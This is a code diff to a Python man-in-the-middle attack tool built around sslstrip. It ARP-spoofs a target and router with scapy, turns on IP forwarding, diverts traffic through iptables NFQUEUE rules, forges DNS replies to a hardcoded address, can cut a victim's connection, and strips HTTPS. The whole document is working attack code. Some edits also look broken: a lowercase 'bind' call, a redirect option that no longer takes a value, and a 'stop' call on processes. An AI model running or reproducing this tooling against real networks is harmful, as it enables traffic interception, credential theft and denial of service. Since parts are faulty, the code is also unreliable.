@@ -8,7 +8,7 @@ import logging
 import sys
 from time import sleep
 from sslstrip.nscanner import Scanner
-import threading
+import multiprocessing
 
 
 def parseOptions(argv):
@@ -25,7 +25,7 @@ def parseOptions(argv):
     scan = ""
 
     try:
-        opts, args = getopt.getopt(argv, "hw:l:t:r:g:i:psafkc",
+        opts, args = getopt.getopt(argv, "hw:l:t:rg:i:psafkc",
                                    ["help", "write=", "post", "ssl", "all", "listen=",
                                     "favicon", "killsessions", "target-ip=", "redirect=", "iface=", "scan=", "cut-net", "gate="])
 
@@ -76,7 +76,13 @@ def get_mac(ip):
     return ans1[1].hwsrc
 
 
-def spoof(target_ip, spoof_ip, target_mac):
+def spoof(target_ip, spoof_ip):
+    while True:
+        try:
+            target_mac = get_mac(target_ip)
+        except Exception:
+            continue
+        break
     arp_spoof = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(arp_spoof, verbose=False)
 
@@ -98,17 +104,23 @@ def process_packet(packet):
                     break
 
 
-def queue(function):
+def cut_queue():
     queue = netfilterqueue.NetfilterQueue()
-    queue.Bind(0, function)
+    queue.Bind(0, cut_net)
     queue.run()
 
 
-def redirect_process(ip, packet):
+def redirect_queue():
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, redirect_process)
+    queue.run()
+
+
+def redirect_process(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        answer = scapy.DNS(rrname=qname, rdata=ip)
+        answer = scapy.DNS(rrname=qname, rdata="192.168.1.10")
         scapy_packet[scapy.DNS].an = answer
         scapy_packet[scapy.DNS].ancount = 1
         del scapy_packet[scapy.IP].chksum
@@ -124,45 +136,51 @@ def cut_net(packet):
 
 
 def enable_forward():
-    command1 = "echo '1' > /proc/sys/net/ipv4/ip_forward".split()
+    command1 = "echo '1' > /proc/sys/net/ipv4/ip_forward"
     subprocess.call(command1, shell=True)
-    command2 = "iptables -I FORWARD -j NFQUEUE --queue-num 0".split()
+    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
+    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
+    command2 = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
     subprocess.call(command2, shell=True)
 
 
 def final_spoof(target_ip, router_ip):
-    target_mac = get_mac(target_ip)
-    router_mac = get_mac(router_ip)
     while True:
-        try:
-            spoof(target_ip, router_ip, target_mac)
-            spoof(router_ip, target_ip, router_mac)
-            sleep(2)
-        except Exception:
-            print("[-] Error While Spoofing the Target")
+        spoof(target_ip, router_ip)
+        spoof(router_ip, target_ip)
 
 
 def main(argv):
-    (logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet,
-     scan) = parseOptions(argv)
-    if scan != "":
-        Scanner().run(scan)
-        sleep(2)
+    try:
+        (logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet,
+        scan) = parseOptions(argv)
+        if scan != "":
+            Scanner().run(scan)
+            sleep(2)
+            sys.exit()
+        else:
+            enable_forward()
+            p1 = multiprocessing.Process(target=Strip().start, args=(logFile, logLevel, listenPort, spoofFavicon, killSessions))
+            p2 = multiprocessing.Process(target=final_spoof, args=(routerIp, targetIp))
+            p1.start()
+            p2.start()
+            try:
+                if cutNet and targetIp:
+                    cut_queue()
+                elif redirect and targetIp:
+                    redirect_queue()
+                elif iface:
+                    sniff(iface)
+                else:
+                    Strip().usage()
+            except Exception:
+                print("[-] Error in Final Comparision")
+    except KeyboardInterrupt:
+        subprocess.call("iptables --flush", shell=True)
+        p1.stop()
+        p2.stop()
+        sleep(1)
         sys.exit()
-    else:
-        enable_forward()
-        threading.Thread.start(Strip().start(logFile, logLevel, listenPort, spoofFavicon, killSessions))
-        threading.Thread.start(final_spoof(routerIp, targetIp))
-        try:
-            if cutNet:
-                queue(cut_net)
-            elif redirect:
-                queue(redirect_process(redirect))
-            else:
-                sniff(iface)
-        except Exception:
-            print("[-] Error in Final Comparision")
-
 
 
 main(sys.argv[1:])
